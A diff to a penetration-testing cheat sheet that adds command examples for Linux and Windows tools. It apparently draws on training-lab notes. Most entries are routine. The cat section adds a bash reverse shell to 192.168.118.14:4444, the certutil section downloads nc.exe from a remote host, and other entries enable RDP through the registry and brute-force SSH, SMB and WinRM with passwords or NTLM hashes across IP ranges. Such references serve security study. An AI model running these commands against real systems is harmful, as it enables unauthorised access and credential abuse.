@@ -439,14 +439,23 @@ cd cheatsheet-pentesting
 ---
 
 ### apt
-- **Scan for Open Ports**:
+- ** Searching for the pure-ftpd Application**:
   ```bash
-  apt -s -p <ip-range>
+  apt-cache search pure-ftpd
   ```
 
-- **Perform OS Detection**:
+- **Viewing Detailed Information About the resource-agents Package**:
   ```bash
-  apt -s -O <ip-address>
+  apt show resource-agents
+  ```
+- **Removing the pure-ftpd Package with Configuration Files**:
+  ```bash
+  apt remove --purge pure-ftpd
+  ```
+
+- **Installing the man-db Application from a Local .deb File**:
+  ```bash
+  sudo dpkg -i man-db_2.7.0.2-5_amd64.deb
   ```
 
 ---
@@ -460,8 +469,17 @@ cd cheatsheet-pentesting
 - **Add Static ARP Entry**:
   ```bash
   arp -s <ip-address> <mac-address>
+  sudo arp -s 10.0.0.2 AA:BB:CC:DD:EE:FF
+  ```
+- **Deleting an ARP Entry**:
+  ```bash
+  sudo arp -d 10.0.0.2
   ```
 
+- **Displaying the ARP Table in a Detailed Format**:
+  ```bash
+  arp -en
+  ```
 ---
 
 ### awk
@@ -474,7 +492,15 @@ cd cheatsheet-pentesting
   ```bash
   awk '/pattern/' <file>
   ```
+- **Extracting Specific Fields from a Delimited String**:
+  ```bash
+  echo "hello::there::friend" | awk -F "::" '{print $1, $3}'
+  ```
 
+- **Using awk with a Unique Delimiter to Process HTML Links**:
+  ```bash
+  grep "href=" index.html | grep "\.megacorpone" | grep -v "www\.megacorpone\.com" | awk -F "http://" '{print $2}'
+  ```
 ---
 
 ### bc
@@ -487,7 +513,15 @@ cd cheatsheet-pentesting
   ```bash
   echo "sqrt(16)" | bc
   ```
+- ** Converting a Binary Number to Decimal**:
+  ```bash
+  echo "ibase=2;11111" | bc
+  ```
 
+- **Converting a Decimal Number to Binary**:
+  ```bash
+  echo "obase=2;7" | bc
+  ```
 ---
 
 ### bettercap
@@ -504,6 +538,17 @@ cd cheatsheet-pentesting
 ---
 
 ### bloodHound
+- **Installing BloodHound**:
+  ```bash
+  sudo apt-get update
+  sudo apt-get install bloodhound
+  ```
+
+  - **Starting and Configuring the Neo4j Database for BloodHound**:
+  ```bash
+  sudo neo4j console
+  ```
+  
 - **Import Data into BloodHound**:
   ```bash
   BloodHound -c <config-file> -i <input-file>
@@ -526,7 +571,11 @@ cd cheatsheet-pentesting
   ```bash
   ls
   ```
-
+  
+- **Authenticating and Interacting with WebDAV Using Cadaver**:
+  ```bash
+  cadaver http://fakeserver.local/webdav/
+  ```
 ---
 
 ### cat
@@ -539,7 +588,18 @@ cd cheatsheet-pentesting
   ```bash
   cat <file1> <file2>
   ```
+- ** Reading a File with Line Numbers**:
+  ```bash
+  cat -n file
+  ```
 
+- **Creating a Reverse Shell Script using (`cat <<EOF ... EOF`) method**:
+  ```bash
+  cat <<EOF>> ./reverse-shell
+  heredoc> #!/bin/bash
+  heredoc>/bin/bash -i >& /dev/tcp/192.168.118.14/4444 0>&1
+  heredoc>EOF
+  ```
 ---
 
 ### certutil
@@ -551,6 +611,16 @@ cd cheatsheet-pentesting
 - **Export Certificate**:
   ```bash
   certutil -exportPFX -user <certificate-name> <output-file>
+  ```
+- **Calculating the SHA-256 Hash of a File**:
+  ```bash
+  certutil -hashfile <file> sha256
+  ```
+
+- **Downloading a File Using Certutil**:
+  ```bash
+  certutil.exe -urlcache -f <url> <file>
+  certutil.exe -urlcache -f http://192.168.119.156/nc.exe nc.exe
   ```
 
 ---
@@ -564,6 +634,11 @@ cd cheatsheet-pentesting
 - **Create Wordlist from Specific Lengths**:
   ```bash
   cewl <url> -w <output-file> -l <min-length> -l <max-length>
+  ```
+- **Generating a Wordlist from a Website Using CeWL: `-m 6` Specifies the minimum word length**:
+  ```bash
+  cewl <url> -m <min-word-length> -w <output-file>
+  cewl www.megacorpone.com -m 6 -w megacorp-cewl.txt
   ```
 
 ---
@@ -591,7 +666,19 @@ cd cheatsheet-pentesting
   ```bash
   cmd /c <command>
   ```
+- **Using forfiles to Find the Path of a file e.g. notepad.exe**:
+  ```bash
+  forfiles /P C:\Windows /S /M notepad.exe /c "cmd /c echo @PATH"
+  ```
 
+- **Activating RDP (Remote Desktop Protocol)**:
+  ```bash
+  reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+  ```
+- **Searching for Files Using `where`**:
+  ```bash
+  where /r C:\ fodhelper.exe
+  ```
 ---
 
 ### comm
@@ -616,6 +703,22 @@ cd cheatsheet-pentesting
 - **Run Commands on Target Machines**:
   ```bash
   crackmapexec smb <target-ip> -u <username> -p <password> -x "<command>"
+  ```
+- **Brute Force SSH on a Range of IPs**:
+  ```bash
+  crackmapexec ssh <target-ip-range> -u <username> -p <password> 
+  crackmapexec ssh 10.11.1.0-254 -u user -p password
+  ```
+
+- **Brute Force SMB with a NTLM Hash on a Range of IPs**:
+  ```bash
+  crackmapexec smb <target-ip-range> -u <username> -H <NTLM>
+  crackmapexec smb 10.11.1.1-200 -u user -H "aad3b41233433234435b51404ee:2d518fe2e4353259eae5db1"
+  ```
+- **Brute Force WinRM with Usernames and Hashs**:
+  ```bash
+  crackmapexec winrm <target-ip> -u <file> -H <file>
+  crackmapexec winrm 192.168.155.175 -u users.txt -H hash.txt
   ```
 
 ### crowbar
